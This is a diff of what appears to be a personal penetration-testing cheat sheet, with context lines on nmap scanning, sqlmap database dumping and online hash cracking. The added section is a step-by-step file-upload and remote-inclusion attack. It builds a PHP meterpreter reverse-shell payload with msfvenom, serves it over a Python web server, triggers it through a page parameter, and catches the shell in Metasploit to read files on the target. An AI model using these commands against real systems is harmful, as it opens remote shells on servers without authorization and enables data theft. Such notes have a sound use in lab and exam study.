@@ -107,7 +107,6 @@ nmap -p 445 192.168.0.X -sC -T5
 -sudo -i
 cd/
 find . -name file.txt
-
 #File & Hash Extraction
 Decrypt hash using:
 https://hashes.com/en/decrypt/hash or https://crackstation.net
@@ -242,6 +241,21 @@ sqlmap -u "http://example.com/?id=4" --dump
 OR JSQL injection tool (url with parameter ID)
 OR page enumeration
 -nmap -sV --script=http-enum ipaddress
+#File Upload vulnerability
+- msfconsole 
+-msfvenom -p php/meterpreter/reverse_tcp LHOST=host ip LPORT=4444 -f raw >exploit.php 
+-python3 -m http.server 80
+-http://ip/?page=http://ip/exploit.php
+-msfconsole
+-use exploit/multi/handler (in msfconsole) 
+-set payload php/meterpreter/reverse_tcp 
+-Set LHOST ip
+-Set LPORT 4444
+-run
+form meterpreter session
+-search -f file.txt
+cat /var/www/html/file.txt
+Upload a file you created as exploit.php Open terminal and type run once you get url type url in brower you get meterpreter session then type ls get the files.
 #Dir busting- find directories and pages of a website.
 Vhost enumeration: find subdomains of a website.
 Dir busting-
